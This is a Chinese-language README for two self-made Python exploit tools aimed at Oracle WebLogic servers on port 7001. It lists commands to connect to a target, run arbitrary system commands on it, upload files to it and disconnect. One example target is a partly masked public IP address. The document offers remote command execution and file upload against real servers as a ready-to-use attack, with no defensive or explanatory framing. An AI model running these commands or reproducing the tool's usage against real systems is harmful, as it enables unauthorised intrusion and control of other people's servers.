# weblogic exp python版
提供2个自用的weblogic exp python的工具，使用时需要讲exp.jar放在同一目录。

# 使用说明：
  
  - **第一个：连接目标**
  ```
  python win_weblogic_exp.py -target 218.*.**.99 -port 7001 -cmd init
  ```
  - **第二个: 执行一句话命令**
  ```
  python win_weblogic_exp.py -target 218.*.**.99 -port 7001 -cmd "cmd /c ipconfig"
  ```
  
  - **第三个：上传文件**
  ```
  python win_weblogic_exp.py -target 192.168.18.133 -port 7001 -cmd upload -lfile "E://boot.ini.txt" -rfile "C://boot.ini.txt"
  ```
  
  - **第四个：断开目标**
 
 ```
 python win_weblogic_exp.py -target 192.168.18.133 -port 7001 -cmd bye
 ```
